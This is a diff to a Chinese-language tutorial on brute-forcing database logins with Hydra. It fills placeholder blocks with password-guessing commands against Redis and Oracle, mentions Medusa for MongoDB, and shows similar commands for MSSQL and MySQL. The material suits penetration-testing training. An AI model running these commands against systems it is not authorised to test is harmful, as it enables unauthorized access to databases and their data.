@@ -119,23 +119,19 @@ hydra -L usernames.txt -P passwords.txt mssql://192.168.xxx.xx
 hydra -l root -P passwords.txt mysql://192.168.xxx.xx
 ```
 
-* **redis**：用于破解 Redis 数据库：
+* **redis**：不直接支持 Redis 认证，但可以通过 TCP 协议进行爆破：
 
 ```bash
-// Some code
-```
-
-* **mongodb**：用于破解 MongoDB 数据库：
-
-```bash
-// Some code
+hydra -L usernames.txt -P passwords.txt -s 6379 192.168.xxx.xx redis
 ```
 
 * **oracle**：用于破解 Oracle 数据库：
 
 ```bash
-// Some code
+hydra -L usernames.txt -P passwords.txt oracle://192.168.xxx.xx
 ```
+
+* **mongodb**：可使用Medusa
 
 ### 组合使用进行爆破（Hydra + BurpSuite）
 
